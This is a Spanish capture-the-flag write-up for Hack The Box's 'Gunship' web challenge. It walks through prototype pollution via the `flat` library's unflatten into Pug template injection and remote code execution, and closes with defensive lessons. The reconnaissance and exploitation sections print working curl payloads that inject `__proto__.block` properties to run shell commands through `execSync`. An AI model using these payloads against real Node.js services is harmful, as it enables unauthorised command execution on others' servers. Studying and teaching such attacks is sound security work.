---
title: "Gunship"
description: "Writeup de Gunship - Hack The Box - Web 100pts. Node.js Express con flat/unflatten; prototype pollution del objeto global permite inyectar propiedades en el template Pug → SSTI → RCE; la flag se filtra en el mensaje de error."
sidebar:
  badge:
    text: Web
    variant: note
tags:
  - htb
  - web
  - nodejs
  - prototype-pollution
  - pug
  - ssti
  - rce
  - flat
  - unflatten
---

# Gunship

> 🎯 Plataforma: Hack The Box
> 📂 Categoría: Web
> 🏆 Puntos: 100
> 👤 Autor: warrior866

---

## Descripción

Aplicación Node.js Express que recibe el nombre de un artista en formato JSON. Internamente usa la librería `flat` para aplanar/desaplanar el objeto — vulnerable a prototype pollution, que permite inyectar código en el motor de templates **Pug**.

---

## Reconocimiento

La aplicación expone un endpoint `POST /api/submit` que acepta JSON con el nombre del artista:

```bash
curl -s -X POST "$HOST/api/submit" \
  -H "Content-Type: application/json" \
  -d '{"artist.name":"test"}'
```

---

## Prototype Pollution via flat/unflatten

La librería `flat` con la opción `unflatten` convierte claves con punto en objetos anidados. Al incluir `__proto__` en la clave, se puede contaminar el prototipo del objeto `Object`:

```bash
curl -s -X POST "$HOST/api/submit" \
  -H "Content-Type: application/json" \
  --data-binary '{
    "artist.name":"Haigh",
    "__proto__.block.type":"Text",
    "__proto__.block.line":"process.mainModule.require(\"child_process\").execSync(\"id\")"
  }'
```

Esto inyecta en `Object.prototype.block` un objeto que Pug renderizará como código JavaScript ejecutable al procesar el template.

---

## RCE — leer la flag

El payload que ejecuta `cat flag*` y filtra el resultado en el mensaje de error de Pug:

```bash
curl -s -X POST "$HOST/api/submit" \
  -H "Content-Type: application/json" \
  --data-binary '{
    "artist.name":"Haigh",
    "__proto__.block.type":"Text",
    "__proto__.block.line":"process.mainModule.require(\"child_process\").execSync(\"$(cat flag*)\")"
  }'
```

Respuesta del servidor (error de Pug con el output del comando embebido):

```json
{
  "error": "Something went wrong: HTB{FLAG}\n is not defined"
}
```

La flag aparece en el mensaje de error porque Pug intenta evaluar el output del comando como nombre de variable.

---

## Cadena de Ataque

```text
1. POST /api/submit con JSON → recibe nombre del artista
       ↓
2. flat/unflatten procesa las claves con punto
       ↓
3. __proto__.block.type/line → contamina Object.prototype
       ↓
4. Pug hereda block.line al renderizar → ejecuta el código JS
       ↓
5. execSync("$(cat flag*)") → output en mensaje de error
       ↓
6. flag en la respuesta JSON de error
```

---

## Lecciones Aprendidas

- **Prototype pollution en librerías de merge/flatten**: `flat`, `lodash.merge`, `deepmerge` y similares son vectores comunes de prototype pollution cuando procesan input del usuario. Validar/sanitizar claves que contengan `__proto__`, `constructor`, `prototype`.
- **Pug (Jade) template execution**: Pug evalúa JavaScript en sus templates. Si datos contaminados del prototipo llegan al contexto de rendering, se convierte en SSTI/RCE.
- **Filtración en mensajes de error**: nunca exponer errores detallados con input del usuario en producción — en este caso el output del comando apareció directamente en la respuesta de error.

---

## Referencias

- [Prototype Pollution — PortSwigger](https://portswigger.net/web-security/prototype-pollution)
- [flat — npm](https://www.npmjs.com/package/flat)
- [Pug template injection](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#pug-jade)
